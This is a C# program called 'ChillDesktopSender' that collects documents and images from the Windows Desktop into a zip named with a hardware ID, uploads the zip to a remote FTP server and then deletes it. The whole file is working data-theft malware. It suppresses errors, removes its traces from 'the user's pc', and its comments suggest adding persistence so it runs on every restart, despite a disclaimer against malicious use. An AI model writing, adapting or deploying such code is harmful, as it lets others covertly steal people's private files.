using System;
using System.Net;
using System.IO;
using System.IO.Compression;

namespace ChillDesktopSender
{
    class Program
    {
        public static bool deleteAfterFtp = true;
        public static bool uploadFTP = true;
        //better set both to true, just made them for debugging purposes
        public static bool extensionsEnabled = true; //if set to false, will upload every extension
        public static string ftpPath = "ftp://mysite.domains.fun/folderpaths/";
        public static string username = "myFtpUsername";
        public static string password = "myFtpPassword";
        public static long length = 8000000;
        public static string[] extensions = new string[]{ ".doc", ".docx", ".txt", ".png", ".jpg" };
        /* Every file will be archived in a zip
        * The zip will be uploaded in the ftp host on the path you have declared in ftpPath
        * Length from the length var is in bytes, 1MB is 1000000 bytes
        * You can add any way for the software to install itself on the pc and send files every pc restart or smth
        * This is not intended for any malicious use
        */


        public static string date = DateTime.Now.ToString();
        public static void ftp(string username, string password, string path, string ftpPath)
        {
            //ftp path looks like "ftp://host/path.zip"
            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential(username, password);
                client.UploadFile(ftpPath, WebRequestMethods.Ftp.UploadFile, path);
            }
        }
        static void Main(string[] args)
        {
            date = date.Replace('/', '_'); //All of those chars cannot be used as path names in windows
            date = date.Replace('\\', '-');
            date = date.Replace(':', '-');
            date = date.Replace('?', '-');
            date = date.Replace('|', '-');
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            //You can change the folder where the zip will be stored below
            string zipPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
            //It's not worth to write an entire function for hwid just for this, so uhwid should do the trick just fine
            //You can also remove the date if you won't run this multiple times on a pc
            zipPath += "\\" + UHWID.UHWIDEngine.AdvancedUid + ' ' + date + ".zip";
            try
            {
                if (File.Exists(zipPath))
                    File.Delete(zipPath);
            } catch { }
            //Get all files from desktop
            string[] files = Directory.GetFiles(desktopPath, "*", SearchOption.AllDirectories);
            /*If you don't care about file size or extensions you could use ZipFile.CreateFromDirectory
            and delete this whole bit of code*/
            using (ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
            {
                foreach (string s in files)
                {
                    long currentLength = new System.IO.FileInfo(s).Length;
                    for (int i = 0; i < extensions.Length; i++)
                        if (s.EndsWith(extensions[i]) && extensionsEnabled)
                            if (currentLength<length)
                                archive.CreateEntryFromFile(s, Path.GetFileName(s));
                }
            }
            //Don't forget to change this bool to true
            if (uploadFTP)
                try { ftp(username, password, zipPath, ftpPath); } catch { }
            try
            {
                if (File.Exists(zipPath) && deleteAfterFtp)
                    File.Delete(zipPath);
            }
            catch { } //We don't want to leave the archive on the user's pc
        }
    }
}
